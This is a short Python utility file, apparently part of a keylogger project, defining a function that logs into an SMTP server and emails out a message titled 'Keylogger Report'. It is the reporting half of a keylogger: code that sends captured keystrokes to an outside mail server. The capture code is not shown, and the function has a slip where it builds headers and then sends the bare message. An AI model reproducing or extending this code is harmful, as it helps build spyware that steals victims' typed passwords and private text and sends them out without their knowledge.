# utils.py
import smtplib

def send_mail(email, password, message):
    sender = "Private Person <from@example.com>"
    receiver = "A Test User <to@example.com>"

    m = f"""\
    Subject: Keylogger Report
    To: {receiver}
    From: {sender}

    Keylogger report\n"""

    m += message
    with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
        server.login(email, password)
        server.sendmail(sender, receiver, message)
